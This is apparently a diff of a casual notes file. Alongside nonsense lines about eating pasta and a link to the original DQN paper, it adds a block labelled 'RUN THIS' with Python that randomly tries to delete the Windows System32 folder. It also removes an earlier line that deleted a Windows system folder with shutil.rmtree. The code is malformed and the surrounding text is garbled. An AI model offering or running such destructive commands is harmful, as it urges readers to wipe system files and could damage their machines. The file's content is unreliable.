@@ -1,6 +1,18 @@
 We slapith and then eat pasta (slrrrrrp).
 YUUUUUUURRRRRRRRRHHHHHHHH
-(shutil.rmtree(C:Windows\SysWOW64\Macromed))
+
+
+
+RUN THIS 
+{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{
+import random
+import os
+if random.randint(0,6) == 1:
+os.remove("C:Windows\System32")
+}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
+
+
+
 This is the paper with the like easiest variant of DQN maybe worth reading
 but there are more intuitive explanations online
 https://arxiv.org/pdf/1312.5602 
